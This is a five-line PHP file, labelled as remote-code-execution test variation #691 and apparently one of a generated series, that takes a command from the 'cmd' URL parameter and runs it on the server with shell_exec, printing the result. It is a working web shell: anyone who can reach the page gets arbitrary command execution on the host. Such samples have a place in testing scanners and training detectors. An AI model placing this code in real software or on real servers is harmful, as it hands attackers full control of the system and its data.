<?php
// RCE test variation #691
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>